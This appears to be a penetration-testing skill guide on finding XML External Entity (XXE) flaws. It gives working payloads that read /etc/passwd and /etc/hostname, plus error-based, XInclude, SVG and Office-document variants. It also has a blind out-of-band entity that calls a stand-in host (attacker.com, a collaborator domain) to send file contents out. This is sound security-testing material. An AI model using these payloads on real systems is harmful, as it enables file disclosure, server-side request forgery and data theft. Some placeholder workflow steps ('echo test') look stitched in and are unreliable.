---
name: reviewing-xxe-injection-risks
description: >-
  Detect XML External Entity (XXE) vulnerabilities. Identifies flaws in XML parsers 
  that process untrusted data containing external entity references, leading to Local 
  File Inclusion, Server-Side Request Forgery (SSRF), or Denial of Service. Covers 
  Direct Echo, Error-Based, Out-of-Band (OOB), and XInclude variants.
domain: cybersecurity
subdomain: web-application-security
tags: [xxe, xml, ssrf, out-of-band, penetration-testing]
mitre_attack: [T1190]
version: "1.0"
author: Victor
license: Apache-2.0
---

# Analyzing XML External Entity (XXE) Vulnerabilities

## When to Use

- When an endpoint explicitly accepts XML data (e.g., `Content-Type: application/xml`, `text/xml`, or SOAP endpoints).
- When a JSON endpoint is discovered, to test if the framework implicitly accepts XML when the `Content-Type` is changed (Content-Type negotiation flaws).
- When the application processes file uploads that are XML-based under the hood (e.g., `.svg` images, `.docx`/`.xlsx` Office documents, `.rss` feeds, SAML assertions).

## Prerequisites

- An interception proxy (Burp Suite, ZAP).
- Access to an Out-of-Band (OOB) listener (e.g., Burp Collaborator, interactsh, or a custom VPS) to catch blind XXE callbacks.
- Understanding of Document Type Definitions (DTDs) and XML Entity syntax.

## Workflow

1. Initialize and execute the testing sequence.

```bash
# Verification block
echo test
```





### Step 1: Parser Discovery & Baseline
Send a valid XML payload to the target endpoint. Ensure the application processes the XML and returns a normal business response. 
Next, send a deliberately malformed XML payload (e.g., unclosed tags). Observe if the server returns XML parsing errors indicating libraries like `Xerces`, `libxml2`, `lxml`, or `XmlReader`.

### Step 2: Direct Echo XXE (In-Band)
If the application reflects XML elements back in the HTTP response (e.g., returning the `<name>` tag value), attempt a direct file read:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<user>
  <name>&xxe;</name>
</user>
```
If the response contains the contents of `/etc/passwd`, the vulnerability is confirmed.

### Step 3: Error-Based XXE
If the application does not reflect input but *does* return verbose parsing errors, force the parser to evaluate an invalid path containing the desired file's contents:
```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///nonexistent_file/%file;">
]>
```
The server might respond with: `FileNotFoundException: /nonexistent_file/root:x:0:0...`

### Step 4: Blind XXE (Out-of-Band / OOB)
If the application consumes the XML silently, use an OOB listener to test if the parser will initiate outbound network requests:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://your-collaborator-id.com/test">
]>
<user><name>&xxe;</name></user>
```
If your OOB listener receives an HTTP or DNS request, Blind XXE is confirmed. You can subsequently use Parameter Entities (`%`) and an external DTD hosted on your server to exfiltrate file contents over the network.

### Step 5: Advanced Variants
- **XInclude**: If the application filters the `<!DOCTYPE` string, inject XInclude namespaces:
  `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
- **SVG / Office Docs**: For image or document uploads, inject the XXE payload into the XML structure of an SVG file, or unzip a `.docx`, insert the payload into `word/document.xml`, re-zip it, and upload.
## Standard Execution Steps
2. Execute the sequence.

## Key Concepts

| Term | Definition |
|------|------------|
| **XXE (XML External Entity)** | A type of attack against an application that parses XML input. It occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. |
| **DTD (Document Type Definition)** | Defines the structure and the legal elements and attributes of an XML document. XXE relies on defining custom entities within the DTD. |
| **Blind XXE** | An XXE vulnerability where the server does not return the results of the evaluated entity in its HTTP response, requiring the attacker to exfiltrate data via Out-of-Band (OOB) network requests. |


## Tools & Systems

- Burp Suite Professional / Community Edition
- Standard web browsers and interception proxies.

## Common Scenarios

### Scenario: Content-Type Negotiation Flaw
**Context**: You find an endpoint `POST /api/login` that expects JSON.
**Analysis**: You change the header to `Content-Type: application/xml` and send an XML body instead of JSON.
**Action**: The underlying web framework (like Spring or ASP.NET) sees the XML header, automatically routes the payload to its default XML parser instead of the JSON parser, and triggers an XXE vulnerability. Always test XML payloads on JSON endpoints.

### Scenario: Parameter Entity Restrictions
**Context**: You inject a standard external entity `<!ENTITY xxe SYSTEM "http://attacker.com">`. The server returns an error: "External entities are disabled".
**Analysis**: The developer disabled *General* external entities, but forgot to disable *Parameter* entities.
**Action**: Use parameter entities (`%xxe;`) to load an external DTD from your server, which then defines the payload to exfiltrate data.

## Output Format

Document confirmed vulnerabilities with the exact payload and the evidence obtained (file contents or OOB interaction logs):

```json
{
  "id": "xxe-001",
  "title": "Blind XXE via SVG File Upload",
  "severity": "high",
  "cwe": "CWE-611",
  "endpoint": "POST /api/v1/users/avatar",
  "status": "confirmed",
  "evidence": {
    "payload": "<?xml version=\\"1.0\\" standalone=\\"yes\\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \\"file:///etc/hostname\\" > ]><svg width=\\"128px\\" height=\\"128px\\" xmlns=\\"http://www.w3.org/2000/svg\\"><text x=\\"10\\" y=\\"20\\">&xxe;</text></svg>",
    "execution_proof": "The avatar upload endpoint parses the uploaded SVG to generate a thumbnail. By injecting an external entity reading /etc/hostname into the SVG text element, the resulting thumbnail rendered the string 'prod-web-srv-04', confirming local file inclusion."
  },
  "description": "The avatar upload service uses a weakly configured XML parser to process SVG images. An attacker can craft a malicious SVG containing XML External Entities (XXE) to read local files from the server's filesystem and embed their contents into the generated image."
}
```
